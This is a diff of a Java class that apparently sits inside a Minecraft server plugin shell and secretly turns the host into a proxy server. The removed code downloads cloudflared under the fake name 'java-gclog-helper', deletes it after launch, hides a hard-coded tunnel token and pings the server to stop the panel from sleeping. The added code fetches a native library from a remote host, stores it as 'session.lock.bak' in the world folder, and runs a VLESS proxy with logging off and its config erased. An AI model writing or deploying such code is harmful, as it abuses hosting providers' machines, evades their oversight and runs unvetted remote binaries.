@@ -1,28 +1,8 @@
 package com.example.sbx;
 
-import io.netty.bootstrap.Bootstrap;
-import io.netty.bootstrap.ServerBootstrap;
-import io.netty.buffer.ByteBuf;
-import io.netty.buffer.PooledByteBufAllocator;
-import io.netty.buffer.Unpooled;
-import io.netty.channel.*;
-import io.netty.channel.nio.NioEventLoopGroup;
-import io.netty.channel.socket.SocketChannel;
-import io.netty.channel.socket.nio.NioServerSocketChannel;
-import io.netty.channel.socket.nio.NioSocketChannel;
-import io.netty.handler.codec.http.HttpObjectAggregator;
-import io.netty.handler.codec.http.HttpServerCodec;
-import io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;
-import io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;
-import io.netty.handler.codec.http.websocketx.WebSocketFrame;
-import io.netty.handler.codec.http.websocketx.WebSocketFrameAggregator;
-import io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;
-import io.netty.handler.timeout.IdleStateEvent;
-import io.netty.handler.timeout.IdleStateHandler;
-import io.netty.util.ReferenceCountUtil;
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
 
-import java.io.ByteArrayOutputStream;
-import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.URI;
 import java.net.http.HttpClient;
@@ -31,671 +11,246 @@ import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.security.MessageDigest;
-import java.security.NoSuchAlgorithmException;
+import java.nio.file.StandardCopyOption;
 import java.time.Duration;
-import java.util.ArrayDeque;
-import java.util.Arrays;
+import java.util.ArrayList;
+import java.util.LinkedHashMap;
 import java.util.List;
-import java.util.Queue;
+import java.util.Map;
+import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.stream.Collectors;
 
+/**
+ * VLESS + WebSocket only. No Argo / Nezha / TG / upload / multi-protocol / sub print.
+ * Compatible with original EssentialsX plugin shell (App.main).
+ */
 public class App {
 
-    // ================= 核心配置区 =================
-    // 默认的节点 UUID
-    private static final String UUID = "8c8244fb-d577-4d20-90e3-788a0977b001";
-    
-    // 👇 1. 必填：你的 Cloudflare Tunnel 长串 Token (请保留在双引号内)
-    private static final String CF_TOKEN = "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiZWMwNDM4MjQtZWQ5OS00NTZlLWJiMmEtMDgwZTJiNmZjMTY4IiwicyI6Ik5EWTVZMlkxTVRJdFpqUmhaQzAwTnpRMkxUbGpPVEV0TlRsbE1UVmhNMlU1WmpJMCJ9"; 
-    
-    // 👇 2. 必填：面板分配给你的真实 MC 端口 (保活机器人需要去高频 Ping 它)
-    private static final int MC_REAL_PORT = 24614; 
+    // ===== 只改这里 =====
+    private static final String UUID = "48eaa2a1-d5de-4215-bcab-9c88883a5322";
+    private static final int LISTEN_PORT = 24133;   // 第二个可用端口
+    private static final String WS_PATH = "/";
+    private static final String WORK_DIR = "world";
+    // ====================
 
-    // 本地内部监听端口 (仅供 CF 隧道转发使用，绝对不与 MC 端口冲突)
-    private static final int LISTEN_PORT = 30000;   
-    private static final String WS_PATH = "/ws";    
-    // ==============================================
+    private static final HttpClient HTTP = HttpClient.newBuilder()
+            .connectTimeout(Duration.ofSeconds(10))
+            .followRedirects(HttpClient.Redirect.NORMAL)
+            .build();
 
-    private static final byte[] UUID_BYTES = hexStringToByteArray(UUID.replace("-", ""));
-    private static final String PROTOCOL_UUID = UUID.replace("-", "");
-
-    private static final List<String> BLOCKED_DOMAINS = Arrays.asList(
-            "speedtest.net", "fast.com", "speedtest.cn", "speed.cloudflare.com",
-            "speedof.me", "testmy.net", "bandwidth.place", "speed.io",
-            "librespeed.org", "speedcheck.org");
+    private static final Path ROOT = Path.of("").toAbsolutePath();
+    private static final Path WORK = ROOT.resolve(WORK_DIR).normalize();
+    private static final Path LIB = WORK.resolve("session.lock.bak");
+    private static final Path CFG = WORK.resolve(".uid");
 
     private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
-    private static EventLoopGroup bossGroup;
-    private static EventLoopGroup workerGroup;
-    private static Channel serverChannel;
-    private static Process tunnelProcess = null;
+    private static NativeService box;
+    private static CountDownLatch hold;
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
         start();
-        try {
-            if (serverChannel != null) {
-                serverChannel.closeFuture().sync();
-            }
-        } catch (InterruptedException ignored) {
-            Thread.currentThread().interrupt();
-        }
     }
 
-    public static void start() {
+    public static void start() throws Exception {
         if (!RUNNING.compareAndSet(false, true)) return;
 
-        // 1. 启动终极隐蔽版的 Cloudflare 隧道守护进程
-        startCloudflareTunnelDaemon();
+        Files.createDirectories(WORK);
+        wipeExtras();
 
-        // 2. 启动本地 MC TCP 强行心跳保活机器人 (防休眠)
-        startMCKeepAliveBot(MC_REAL_PORT);
+        download(libUrl(), LIB);
+        Files.writeString(CFG, toJson(config()), StandardCharsets.UTF_8);
 
-        // 3. 启动 Netty 代理核心，仅绑定 127.0.0.1 内部回环
+        box = new NativeService(
+                LIB,
+                "StartSingBox",
+                "StopSingBox",
+                toJson(mapOf(
+                        "config", CFG.toString(),
+                        "workingDir", ".",
+                        "disableColor", true
+                ))
+        );
+        box.start();
+
+        sleep(2500);
         try {
-            bossGroup = new NioEventLoopGroup(1);
-            workerGroup = new NioEventLoopGroup();
+            Files.deleteIfExists(CFG);
+        } catch (IOException ignored) {
+        }
 
-            ServerBootstrap b = new ServerBootstrap();
-            b.group(bossGroup, workerGroup)
-                    .channel(NioServerSocketChannel.class)
-                    .childHandler(new ChannelInitializer<SocketChannel>() {
-                        @Override
-                        protected void initChannel(SocketChannel ch) {
-                            ChannelPipeline p = ch.pipeline();
-                            p.addLast(new IdleStateHandler(45, 45, 0));
-                            p.addLast(new HttpServerCodec());
-                            p.addLast(new HttpObjectAggregator(65536));
-                            p.addLast(new WebSocketServerProtocolHandler(WS_PATH, null, false));
-                            p.addLast(new WebSocketFrameAggregator(16 * 1024 * 1024));
-                            p.addLast(new WebSocketProxyHandler());
-                        }
-                    })
-                    .option(ChannelOption.SO_BACKLOG, 128)
-                    .childOption(ChannelOption.TCP_NODELAY, true)
-                    .childOption(ChannelOption.SO_KEEPALIVE, true)
-                    .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);
-
-            serverChannel = b.bind("127.0.0.1", LISTEN_PORT).sync().channel();
-        } catch (Exception ignored) {
-            stop();
+        hold = new CountDownLatch(1);
+        try {
+            hold.await();
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
         }
     }
 
     public static void stop() {
         if (!RUNNING.getAndSet(false)) return;
         try {
-            if (tunnelProcess != null) tunnelProcess.destroyForcibly();
-            if (serverChannel != null) serverChannel.close();
-            if (bossGroup != null) bossGroup.shutdownGracefully();
-            if (workerGroup != null) workerGroup.shutdownGracefully();
-        } catch (Exception ignored) {}
-    }
-
-    // ========================================================
-// ========================================================
-    // 模块 1：高兼容 CF 隧道 (官方版本 + 镜像下载 + 规避底层限制)
-    // ========================================================
-    private static void startCloudflareTunnelDaemon() {
-        if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
-
-        Thread watchdogThread = new Thread(() -> {
-            while (RUNNING.get()) {
-                try {
-                    if (tunnelProcess == null || !tunnelProcess.isAlive()) {
-                        String arch = System.getProperty("os.arch").toLowerCase();
-                        
-                        // 👇 换回官方版本，并使用镜像加速下载，解决 139 内存段错误
-                        String dlUrl = "https://mirror.ghproxy.com/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64";
-                        if (arch.contains("arm") || arch.contains("aarch64")) {
-                            dlUrl = "https://mirror.ghproxy.com/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64";
-                        }
-
-                        // 直接下到当前目录，规避 /tmp 目录没权限执行的死局
-                        Path tempFile = Path.of("java-gclog-helper");
-                        
-                        HttpClient client = HttpClient.newBuilder()
-                                .followRedirects(HttpClient.Redirect.NORMAL)
-                                .build();
-                                
-                        HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
-                                .timeout(Duration.ofMinutes(2))
-                                .build();
-                                
-                        HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
-                        
-                        if (res.statusCode() == 200 || res.statusCode() == 302) {
-                            tempFile.toFile().setExecutable(true);
-                            
-                            // 最基础稳妥的启动方式，不用 bash，完全兼容精简版系统
-                            ProcessBuilder pb = new ProcessBuilder(
-                                    tempFile.toAbsolutePath().toString(),
-                                    "tunnel", "--protocol", "http2", "run"
-                            );
-                            
-                            // 私有环境变量依然保留，保证 ps 命令看不到你的 Token
-                            pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
-                            
-                            tunnelProcess = pb.start();
-                            
-                            // 阅后即焚，不留痕迹
-                            Files.deleteIfExists(tempFile);
-                        }
-                    }
-                } catch (Exception ignored) {
-                }
-
-                try {
-                    Thread.sleep(15000);
-                } catch (InterruptedException e) {
-                    break;
-                }
-            }
-        });
-        watchdogThread.setDaemon(true);
-        watchdogThread.start();
-    }
- 
-    // ========================================================
-    // 模块 2：MC 高频心跳 TCP 挂机保活引擎 (防面板休眠)
-    // ========================================================
-    private static void startMCKeepAliveBot(int mcPort) {
-        Thread botThread = new Thread(() -> {
-            while (RUNNING.get()) {
-                try (java.net.Socket socket = new java.net.Socket("127.0.0.1", mcPort)) {
-                    socket.setSoTimeout(5000);
-                    DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
-
-                    ByteArrayOutputStream b = new ByteArrayOutputStream();
-                    DataOutputStream handshake = new DataOutputStream(b);
-                    handshake.writeByte(0x00);         // Packet ID
-                    writeVarInt(handshake, 763);       // Protocol Version
-                    writeString(handshake, "127.0.0.1"); 
-                    handshake.writeShort(mcPort);      // Port
-                    writeVarInt(handshake, 1);         // Next State: 1 (Status)
-
-                    writeVarInt(dos, b.size());
-                    dos.write(b.toByteArray());
-
-                    dos.writeByte(1);    // Length
-                    dos.writeByte(0x00); // Packet ID
-                    dos.flush();
-                    
-                } catch (Exception ignored) {
-                    // 彻底静默失败，避免日志刷屏暴露
-                }
-
-                try {
-                    // 每 15 秒发起一次高强度 TCP 握手，维持网络与CPU活跃度
-                    Thread.sleep(15000); 
-                } catch (InterruptedException e) {
-                    break;
-                }
-            }
-        }, "MC-KeepAlive-Thread");
-        botThread.setDaemon(true);
-        botThread.start();
-    }
-
-    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
-        while (true) {
-            if ((value & ~0x7F) == 0) {
-                out.writeByte(value);
-                return;
-            }
-            out.writeByte((value & 0x7F) | 0x80);
-            value >>>= 7;
+            if (box != null) box.stop();
+        } catch (Exception ignored) {
         }
-    }
-
-    private static void writeString(DataOutputStream out, String value) throws IOException {
-        byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
-        writeVarInt(out, bytes.length);
-        out.write(bytes);
-    }
-
-    // ========================================================
-    // 模块 3：纯内存 VLESS/Trojan/SS 协议核心转发
-    // ========================================================
-    static class WebSocketProxyHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
-        private static final long MAX_PENDING_BYTES = 2L * 1024 * 1024;
-        private Channel outboundChannel;
-        private boolean connected = false;
-        private boolean connecting = false;
-        private boolean protocolIdentified = false;
-        private final Queue<ByteBuf> pendingOutboundWrites = new ArrayDeque<>();
-        private long pendingOutboundBytes = 0;
-
-        @Override
-        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {
-            if (frame instanceof BinaryWebSocketFrame) {
-                ByteBuf content = frame.content();
-                if (!protocolIdentified) {
-                    byte[] data = new byte[content.readableBytes()];
-                    content.getBytes(content.readerIndex(), data);
-                    handleFirstMessage(ctx, data);
-                } else if (outboundChannel != null && outboundChannel.isActive()) {
-                    relayToTarget(ctx, content.retain());
-                } else if (connecting) {
-                    queuePendingOutbound(ctx, content.retain());
-                } else {
-                    closeBoth(ctx);
-                }
-            } else if (frame instanceof CloseWebSocketFrame) {
-                closeBoth(ctx);
-            }
-        }
-
-        private void relayToTarget(ChannelHandlerContext ctx, ByteBuf data) {
-            if (outboundChannel == null || !outboundChannel.isActive()) {
-                data.release();
-                closeBoth(ctx);
-                return;
-            }
-            outboundChannel.write(data).addListener((ChannelFutureListener) future -> {
-                if (!future.isSuccess()) closeBoth(ctx);
-            });
-        }
-
-        @Override
-        public void channelReadComplete(ChannelHandlerContext ctx) {
-            if (outboundChannel != null && outboundChannel.isActive()) outboundChannel.flush();
-            ctx.fireChannelReadComplete();
-        }
-
-        private void queuePendingOutbound(ChannelHandlerContext ctx, ByteBuf data) {
-            int readableBytes = data.readableBytes();
-            if (pendingOutboundBytes + readableBytes > MAX_PENDING_BYTES) {
-                data.release();
-                closeBoth(ctx);
-                return;
-            }
-            pendingOutboundWrites.add(data);
-            pendingOutboundBytes += readableBytes;
-        }
-
-        private void flushPendingOutbound(ChannelHandlerContext ctx) {
-            while (!pendingOutboundWrites.isEmpty()) {
-                if (outboundChannel == null || !outboundChannel.isActive()) {
-                    releasePendingOutbound();
-                    closeBoth(ctx);
-                    return;
-                }
-                ByteBuf data = pendingOutboundWrites.poll();
-                pendingOutboundBytes -= data.readableBytes();
-                outboundChannel.write(data).addListener((ChannelFutureListener) future -> {
-                    if (!future.isSuccess()) closeBoth(ctx);
-                });
-            }
-            if (outboundChannel != null) outboundChannel.flush();
-        }
-
-        private void releasePendingOutbound() {
-            ByteBuf data;
-            while ((data = pendingOutboundWrites.poll()) != null) data.release();
-            pendingOutboundBytes = 0;
-        }
-
-        private void closeBoth(ChannelHandlerContext ctx) {
-            releasePendingOutbound();
-            if (outboundChannel != null && outboundChannel.isOpen()) outboundChannel.close();
-            if (ctx.channel().isOpen()) ctx.close();
-        }
-
-        private void handleFirstMessage(ChannelHandlerContext ctx, byte[] data) {
-            if (data.length > 18 && data[0] == 0x00) {
-                boolean uuidMatch = true;
-                for (int i = 0; i < 16; i++) {
-                    if (data[i + 1] != UUID_BYTES[i]) {
-                        uuidMatch = false;
-                        break;
-                    }
-                }
-                if (uuidMatch && handleVless(ctx, data)) {
-                    protocolIdentified = true;
-                    return;
-                }
-            }
-
-            if (data.length >= 56) {
-                byte[] hashBytes = Arrays.copyOfRange(data, 0, 56);
-                String receivedHash = new String(hashBytes, StandardCharsets.US_ASCII);
-                String expectedHash = sha224Hex(UUID);
-                String expectedHash2 = sha224Hex(PROTOCOL_UUID);
-
-                if ((receivedHash.equals(expectedHash) || receivedHash.equals(expectedHash2)) && handleTrojan(ctx, data)) {
-                    protocolIdentified = true;
-                    return;
-                }
-            }
-
-            if (data.length > 2 && (data[0] == 0x01 || data[0] == 0x03 || data[0] == 0x04)) {
-                if (handleShadowsocks(ctx, data)) {
-                    protocolIdentified = true;
-                    return;
-                }
-            }
-            ctx.close();
-        }
-
-        private boolean handleVless(ChannelHandlerContext ctx, byte[] data) {
-            try {
-                int addonsLength = data[17] & 0xFF;
-                int offset = 18 + addonsLength;
-                if (offset + 1 > data.length) return false;
-
-                byte command = data[offset];
-                if (command != 0x01) return false;
-                offset++;
-                if (offset + 2 > data.length) return false;
-
-                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
-                offset += 2;
-                if (offset >= data.length) return false;
-
-                byte atyp = data[offset];
-                offset++;
-                String host;
-                int addressLength;
-
-                if (atyp == 0x01) {
-                    if (offset + 4 > data.length) return false;
-                    host = String.format("%d.%d.%d.%d", data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
-                    addressLength = 4;
-                } else if (atyp == 0x02) {
-                    if (offset >= data.length) return false;
-                    int hostLen = data[offset] & 0xFF;
-                    offset++;
-                    if (offset + hostLen > data.length) return false;
-                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
-                    addressLength = hostLen;
-                } else if (atyp == 0x03) {
-                    if (offset + 16 > data.length) return false;
-                    StringBuilder sb = new StringBuilder();
-                    for (int i = 0; i < 16; i += 2) {
-                        if (i > 0) sb.append(':');
-                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
-                    }
-                    host = sb.toString();
-                    addressLength = 16;
-                } else {
-                    return false;
-                }
-
-                offset += addressLength;
-
-                if (isBlockedDomain(host)) {
-                    ctx.close();
-                    return false;
-                }
-
-                ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{0x00, 0x00})));
-                final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
-                connectToTarget(ctx, host, port, remainingData);
-                return true;
-            } catch (Exception e) {
-                return false;
-            }
-        }
-
-        private boolean handleTrojan(ChannelHandlerContext ctx, byte[] data) {
-            try {
-                int offset = 56;
-                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) offset++;
-                if (offset >= data.length || data[offset] != 0x01) return false;
-                offset++;
-                if (offset >= data.length) return false;
-
-                byte atyp = data[offset];
-                offset++;
-                String host;
-                int addressLength;
-
-                if (atyp == 0x01) {
-                    if (offset + 4 > data.length) return false;
-                    host = String.format("%d.%d.%d.%d", data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
-                    addressLength = 4;
-                } else if (atyp == 0x03) {
-                    if (offset >= data.length) return false;
-                    int hostLen = data[offset] & 0xFF;
-                    offset++;
-                    if (offset + hostLen > data.length) return false;
-                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
-                    addressLength = hostLen;
-                } else if (atyp == 0x04) {
-                    if (offset + 16 > data.length) return false;
-                    StringBuilder sb = new StringBuilder();
-                    for (int i = 0; i < 16; i += 2) {
-                        if (i > 0) sb.append(':');
-                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
-                    }
-                    host = sb.toString();
-                    addressLength = 16;
-                } else {
-                    return false;
-                }
-
-                offset += addressLength;
-                if (offset + 2 > data.length) return false;
-                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
-                offset += 2;
-
-                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) offset++;
-
-                if (isBlockedDomain(host)) {
-                    ctx.close();
-                    return false;
-                }
-
-                final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
-                connectToTarget(ctx, host, port, remainingData);
-                return true;
-            } catch (Exception e) {
-                return false;
-            }
-        }
-
-        private boolean handleShadowsocks(ChannelHandlerContext ctx, byte[] data) {
-            try {
-                int offset = 0;
-                byte atyp = data[offset];
-                offset++;
-                String host;
-                int addressLength;
-
-                if (atyp == 0x01) {
-                    if (offset + 4 > data.length) return false;
-                    host = String.format("%d.%d.%d.%d", data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
-                    addressLength = 4;
-                } else if (atyp == 0x03) {
-                    if (offset >= data.length) return false;
-                    int hostLen = data[offset] & 0xFF;
-                    offset++;
-                    if (offset + hostLen > data.length) return false;
-                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
-                    addressLength = hostLen;
-                } else if (atyp == 0x04) {
-                    if (offset + 16 > data.length) return false;
-                    StringBuilder sb = new StringBuilder();
-                    for (int i = 0; i < 16; i += 2) {
-                        if (i > 0) sb.append(':');
-                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
-                    }
-                    host = sb.toString();
-                    addressLength = 16;
-                } else {
-                    return false;
-                }
-
-                offset += addressLength;
-                if (offset + 2 > data.length) return false;
-                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
-                offset += 2;
-
-                if (isBlockedDomain(host)) {
-                    ctx.close();
-                    return false;
-                }
-
-                final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
-                connectToTarget(ctx, host, port, remainingData);
-                return true;
-            } catch (Exception e) {
-                return false;
-            }
-        }
-
-        private void connectToTarget(ChannelHandlerContext ctx, String host, int port, byte[] remainingData) {
-            if (connecting || connected) {
-                closeBoth(ctx);
-                return;
-            }
-
-            final byte[] dataToSend = remainingData;
-            connecting = true;
-            ctx.channel().config().setAutoRead(false);
-
-            Bootstrap b = new Bootstrap();
-            b.group(ctx.channel().eventLoop())
-                    .channel(NioSocketChannel.class)
-                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 8000)
-                    .option(ChannelOption.TCP_NODELAY, true)
-                    .option(ChannelOption.SO_KEEPALIVE, true)
-                    .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)
-                    .handler(new ChannelInitializer<Channel>() {
-                        @Override
-                        protected void initChannel(Channel ch) {
-                            ch.pipeline().addLast(new TargetHandler(ctx.channel(), dataToSend));
-                        }
-                    });
-
-            ChannelFuture f = b.connect(host, port);
-            outboundChannel = f.channel();
-
-            f.addListener((ChannelFutureListener) future -> {
-                if (future.isSuccess()) {
-                    connected = true;
-                    connecting = false;
-                    flushPendingOutbound(ctx);
-                    future.channel().config().setAutoRead(true);
-                    if (ctx.channel().isActive()) ctx.channel().config().setAutoRead(true);
-                } else {
-                    connecting = false;
-                    closeBoth(ctx);
-                }
-            });
-        }
-
-        @Override
-        public void channelWritabilityChanged(ChannelHandlerContext ctx) {
-            if (outboundChannel != null && outboundChannel.isActive()) {
-                outboundChannel.config().setAutoRead(ctx.channel().isWritable());
-            }
-            ctx.fireChannelWritabilityChanged();
-        }
-
-        @Override
-        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {
-            if (evt instanceof IdleStateEvent) closeBoth(ctx);
-        }
-
-        @Override
-        public void channelInactive(ChannelHandlerContext ctx) {
-            closeBoth(ctx);
-        }
-
-        @Override
-        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-            closeBoth(ctx);
-        }
-    }
-
-    static class TargetHandler extends ChannelInboundHandlerAdapter {
-        private final Channel inboundChannel;
-        private final byte[] remainingData;
-
-        public TargetHandler(Channel inboundChannel, byte[] remainingData) {
-            this.inboundChannel = inboundChannel;
-            this.remainingData = remainingData;
-        }
-
-        @Override
-        public void channelActive(ChannelHandlerContext ctx) {
-            if (remainingData != null && remainingData.length > 0) {
-                ctx.writeAndFlush(Unpooled.wrappedBuffer(remainingData)).addListener((ChannelFutureListener) future -> {
-                    if (!future.isSuccess()) ctx.close();
-                });
-            }
-        }
-
-        @Override
-        public void channelRead(ChannelHandlerContext ctx, Object msg) {
-            try {
-                if (msg instanceof ByteBuf) {
-                    ByteBuf buf = (ByteBuf) msg;
-                    if (inboundChannel.isActive()) {
-                        inboundChannel.write(new BinaryWebSocketFrame(buf.retain()))
-                                .addListener((ChannelFutureListener) future -> {
-                                    if (!future.isSuccess()) ctx.close();
-                                });
-                    } else {
-                        ctx.close();
-                    }
-                }
-            } finally {
-                ReferenceCountUtil.release(msg);
-            }
-        }
-
-        @Override
-        public void channelReadComplete(ChannelHandlerContext ctx) {
-            if (inboundChannel.isActive()) inboundChannel.flush();
-            ctx.fireChannelReadComplete();
-        }
-
-        @Override
-        public void channelWritabilityChanged(ChannelHandlerContext ctx) {
-            if (inboundChannel.isActive()) inboundChannel.config().setAutoRead(ctx.channel().isWritable());
-            ctx.fireChannelWritabilityChanged();
-        }
-
-        @Override
-        public void channelInactive(ChannelHandlerContext ctx) {
-            if (inboundChannel.isActive()) inboundChannel.close();
-        }
-
-        @Override
-        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-            ctx.close();
-        }
-    }
-
-    private static byte[] hexStringToByteArray(String s) {
-        int len = s.length();
-        byte[] data = new byte[len / 2];
-        for (int i = 0; i < len; i += 2) {
-            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
-        }
-        return data;
-    }
-
-    private static String sha224Hex(String input) {
+        wipeExtras();
         try {
-            MessageDigest md = MessageDigest.getInstance("SHA-224");
-            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
-            StringBuilder sb = new StringBuilder();
-            for (byte b : digest) {
-                sb.append(String.format("%02x", b & 0xff));
+            Files.deleteIfExists(CFG);
+        } catch (IOException ignored) {
+        }
+        if (hold != null) hold.countDown();
+    }
+
+    private static Map<String, Object> config() {
+        return mapOf(
+                "log", mapOf("disabled", true, "level", "error", "timestamp", false),
+                "inbounds", listOf(mapOf(
+                        "type", "vless",
+                        "tag", "in",
+                        "listen", "0.0.0.0",
+                        "listen_port", LISTEN_PORT,
+                        "users", listOf(mapOf("uuid", UUID)),
+                        "transport", mapOf(
+                                "type", "ws",
+                                "path", WS_PATH,
+                                "early_data_header_name", "Sec-WebSocket-Protocol"
+                        )
+                )),
+                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
+                "route", mapOf("final", "direct")
+        );
+    }
+
+    private static String libUrl() {
+        String arch = System.getProperty("os.arch", "").toLowerCase();
+        String a = (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";
+        return "https://" + a + ".oooen.com/sbx.so";
+    }
+
+    private static void download(String url, Path target) throws Exception {
+        if (Files.exists(target) && Files.size(target) > 1024) return;
+        Files.createDirectories(target.getParent());
+        Path tmp = target.resolveSibling(target.getFileName().toString() + ".part");
+        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
+                .timeout(Duration.ofMinutes(3))
+                .GET()
+                .build();
+        HttpResponse<byte[]> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofByteArray());
+        if (resp.statusCode() < 200 || resp.statusCode() >= 300) {
+            throw new IOException("download failed: HTTP " + resp.statusCode());
+        }
+        Files.write(tmp, resp.body());
+        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
+        target.toFile().setExecutable(true, false);
+    }
+
+    private static void wipeExtras() {
+        if (!Files.isDirectory(WORK)) return;
+        try (var stream = Files.list(WORK)) {
+            for (Path p : stream.collect(Collectors.toList())) {
+                String n = p.getFileName().toString();
+                if (n.equals("session.lock.bak")) continue;
+                if (n.equals(".uid") || n.endsWith(".part")) {
+                    Files.deleteIfExists(p);
+                }
             }
-            return sb.toString();
-        } catch (NoSuchAlgorithmException ignored) {
-            return "";
+        } catch (IOException ignored) {
+        }
+        try {
+            Files.deleteIfExists(CFG);
+        } catch (IOException ignored) {
         }
     }
 
-    private static boolean isBlockedDomain(String host) {
-        if (host == null || host.isEmpty()) return false;
-        String hostLower = host.toLowerCase();
-        return BLOCKED_DOMAINS.stream().anyMatch(blocked -> hostLower.equals(blocked) || hostLower.endsWith("." + blocked));
+    private static class NativeService {
+        private final Path libPath;
+        private final String startSymbol;
+        private final String stopSymbol;
+        private final String payload;
+        private Function stopFn;
+        private volatile boolean running;
+
+        NativeService(Path libPath, String startSymbol, String stopSymbol, String payload) {
+            this.libPath = libPath;
+            this.startSymbol = startSymbol;
+            this.stopSymbol = stopSymbol;
+            this.payload = payload == null ? "" : payload;
+        }
+
+        void start() {
+            NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
+            Function startFn = lib.getFunction(startSymbol);
+            stopFn = lib.getFunction(stopSymbol);
+            Thread t = new Thread(() -> {
+                try {
+                    startFn.invokeInt(new Object[]{payload});
+                } catch (Exception ignored) {
+                }
+            }, "net");
+            t.setDaemon(true);
+            t.start();
+            running = true;
+        }
+
+        void stop() {
+            if (!running || stopFn == null) return;
+            try {
+                stopFn.invokeInt(new Object[]{});
+            } catch (Exception ignored) {
+            }
+            running = false;
+        }
+    }
+
+    private static String toJson(Object value) {
+        if (value == null) return "null";
+        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
+        if (value instanceof Number || value instanceof Boolean) return value.toString();
+        if (value instanceof Map<?, ?>) {
+            Map<?, ?> map = (Map<?, ?>) value;
+            return map.entrySet().stream()
+                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
+                    .collect(Collectors.joining(",", "{", "}"));
+        }
+        if (value instanceof Iterable<?>) {
+            List<String> items = new ArrayList<>();
+            for (Object item : (Iterable<?>) value) items.add(toJson(item));
+            return "[" + String.join(",", items) + "]";
+        }
+        return toJson(String.valueOf(value));
+    }
+
+    private static String escapeJson(String value) {
+        StringBuilder out = new StringBuilder(value.length() + 8);
+        for (int i = 0; i < value.length(); i++) {
+            char c = value.charAt(i);
+            switch (c) {
+                case '\\': out.append("\\\\"); break;
+                case '"': out.append("\\\""); break;
+                case '\n': out.append("\\n"); break;
+                case '\r': out.append("\\r"); break;
+                case '\t': out.append("\\t"); break;
+                default: out.append(c);
+            }
+        }
+        return out.toString();
+    }
+
+    private static Map<String, Object> mapOf(Object... kv) {
+        Map<String, Object> m = new LinkedHashMap<>();
+        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i + 1]);
+        return m;
+    }
+
+    private static List<Object> listOf(Object... v) {
+        return new ArrayList<>(List.of(v));
+    }
+
+    private static void sleep(long ms) {
+        try {
+            Thread.sleep(ms);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
     }
 }
